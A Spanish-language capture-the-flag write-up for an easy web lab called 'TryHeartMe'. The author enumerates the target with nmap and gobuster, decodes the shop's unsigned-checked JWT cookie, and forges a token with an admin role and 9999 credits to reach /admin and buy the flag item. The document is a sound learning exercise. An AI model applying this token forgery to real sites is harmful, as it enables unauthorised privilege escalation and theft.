
## Resumen
TryHeart me es una maquina de web de dificultad facil en la que nos piden que compremos un producto oculto llamado ValenFlag y  en la que se puede vulnerar el (JWT) ya que no tiene ningún tipo de seguridad y se puede modificar sin utilizar la firma. 



# Vector de ataque

## Enumeracion 
Empiezo haciendo un nmap a la maquina objetivo con `nmap -sVC`
`nmap -sVC vmip`

```Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 17:02 -0400
Nmap scan report for 10.130.153.51
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ba:6f:5a:89:ea:06:f8:17:8b:d9:49:84:b6:77:88:aa (ECDSA)
|_  256 16:ec:2b:50:67:90:87:62:23:b0:0a:51:47:57:6b:bb (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: TryHeartMe \xE2\x80\x94 Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.67 seconds
```


Veo que tiene abierto un SSH en el puerto 22 y un servidor web en el puerto 5000.
Voy a empezar analizando la web.

## Analisis del puerto 5000
Empiezo haciendo un curl a la pagina para extraer mas informacion.

`curl 10.130.153.51:5000 `
````
 <!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>TryHeartMe — Shop</title>
  <link rel="stylesheet" href="/static/css/style.css">
  <script defer src="/static/js/app.js"></script>
</head>
<body>
<header class="topbar">
  <a class="brand" href="/">
    <img class="brand-mark" src="/static/img/logo.png" alt="TryHeartMe">
  </a>

    <nav class="nav">
      <a href="/" class="navlink">Shop</a>
      
        <a href="/login" class="navbtn navbtn--pill">Login</a>
        <a href="/register" class="navbtn navbtn--primary navbtn--pill">Sign up</a>
      
    </nav>
  </header>

  <main class="container">
    
      
    
    
<div class="page-head">
  <div>
    <h1 class="page-title">TryHeartMe Valentines Shop</h1>
    <p class="page-sub">Flowers, heart chocolates, and sweet surprises. Buy items using credits. Online top-ups are currently unavailable.</p>
  </div>
  <div class="toolbar">
    
      <span class="pill">Guest</span>
    
  </div>
</div>

<div class="grid grid--3">
  
    <a class="product" href="/product/rose-bouquet">
      <span class="badge ">Popular</span>
      <img class="product-img" src="/static/img/flowers.jpg" alt="">
      <div class="product-body">
        <div class="product-name">Rose Bouquet (12 stems)</div>
        <div class="product-desc">Fresh-cut roses with a satin ribbon. Delivered with a handwritten note.</div>
        <div class="product-foot">
          <div class="price">120 credits</div>
          <div style="color:var(--muted); font-size:12px">View</div>
        </div>
      </div>
    </a>
  
    <a class="product" href="/product/heart-choco">
      <span class="badge ">Limited</span>
      <img class="product-img" src="/static/img/heart-choco.jpg" alt="">
      <div class="product-body">
        <div class="product-name">Heart Chocolates (Box)</div>
        <div class="product-desc">Assorted heart-shaped chocolates with caramel &amp; praline.</div>
        <div class="product-foot">
          <div class="price">85 credits</div>
          <div style="color:var(--muted); font-size:12px">View</div>
        </div>
      </div>
    </a>
  
    <a class="product" href="/product/strawberry-dip">
      <span class="badge ">Sweet</span>
      <img class="product-img" src="/static/img/strawberries.jpg" alt="">
      <div class="product-body">
        <div class="product-name">Chocolate-Dipped Strawberries</div>
        <div class="product-desc">A dozen strawberries dipped in dark chocolate and pink drizzle.</div>
        <div class="product-foot">
          <div class="price">60 credits</div>
          <div style="color:var(--muted); font-size:12px">View</div>
        </div>
      </div>
    </a>
  
    <a class="product" href="/product/love-letter">
      <span class="badge ">Classic</span>
      <img class="product-img" src="/static/img/letter.jpg" alt="">
      <div class="product-body">
        <div class="product-name">Love Letter Card</div>
        <div class="product-desc">Premium card + envelope. Choose a message or write your own.</div>
        <div class="product-foot">
          <div class="price">25 credits</div>
          <div style="color:var(--muted); font-size:12px">View</div>
        </div>
      </div>
    </a>
  
</div>

  </main>

</body>
</html>                         
````


Ya con el curl y entrando a la web veo que es una tienda con tematica de SanValentin en la que te puede loggear. 

Sigo usando gobuster para ver si hay algun subdirectorio de utilidad.
`gobuster dir -u http://10.128.164.142:5000   -w /usr/share/wordlists/dirb/common.txt `
````
===============================================================
[+] Url:                     http://10.128.164.142:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
account              (Status: 302) [Size: 227] [--> /login?next=/account]
admin                (Status: 302) [Size: 223] [--> /login?next=/admin]
login                (Status: 200) [Size: 1461]
logout               (Status: 302) [Size: 189] [--> /]
register             (Status: 200) [Size: 1517]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

````

Veo que hay un subdirectorio llamado `admin` y al entrar me salta un error 403 Forbbiden probablemente nos dejara entrar si consigo ser admin.


Al crear la cuenta veo que sale un indicador de creditos que es para comprar en la tienda y luego al entrar a cualquier producto veo que tengo el rango de `User`

Al interceptar una peticion con burpsuite veo que se asigna un JWT. `Cookie: tryheartme_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhQGdtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiY3JlZGl0cyI6MCwiaWF0IjoxNzg4ODE1NTI0LC`

Al copiar la cookie me doy cuenta de que me da mas informacion asi que la decodifico ya que me va a hacer el trabajo mas facil.
`Cookie:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhQGdtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiY3JlZGl0cyI6MCwiaWF0IjoxNzg4ODE1NTI0LCJ0aGVtZSI6InZhbGVudGluZSJ9.l9ut4fhDGcodDq4knW3e6ofkD7xCTeHYZvOi76tQ-bw`


Viendo esto y que se son asigna el rango de `User` me indica que igual podria cambiar el valor del token a mi favor para conseguir admin.

Pase el valor del token por https://www.jwt.io/ y al decodificarlo me dio este valor.

Header decodificado: ```{

  "alg": "HS256",

  "typ": "JWT"

}```

Payload decodificado:
````
{

  "email": "aa@gmail.com",

  "role": "user",

  "credits": 0,

  "iat": 1788815524,

  "theme": "valentine"

}
````

Voy a la web para codificar el role por `admin` y me pongo algunos creditos.
````
{
  "email": "aa@gmail.com",
  "role": "admin",
  "credits": 9999,
  "iat": 1788815524,
  "theme": "valentine"
}
````

Al codificarlo se queda asi:
````
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFhQGdtYWlsLmNvbSIsInJvbGUiOiJhZG1pbiIsImNyZWRpdHMiOjk5OTksImlhdCI6MTc4ODgxNTUyNCwidGhlbWUiOiJ2YWxlbnRpbmUifQ.egIn2TMoFZpxUmr4d144i6jDGFntF7VWcD7zAIZyziE
````

Al cambiar la cookie y refrescar la pagina veo que han cambiado mis creditos y mi rango asi que ahora pruebo el subdirectorio de `admin` y veo que me deja entrar y esta el objeto que nos piden. Asi que al comprarlo me da la flag.

![alt text](Imagenes/Flag.png)

Luego volvi a probar a codificar de nuevo pero cambiando el apartado de `secret` que equivale a la firma en la web de https://www.jwt.io/ y al volver a probar vi que seguia funcionando igual asi que asi se que el servidor no comprobaba la firma.  
## Cosas aprendidas
1. **Manipulacion JWT:** Aprendi ya que si la cookie o el token no esta bien firmado o carece de medidas de seguridad y ademas guarda valores importantes como el rango y los creditos puede ser facilmente cambiado para ganar privilegios.
 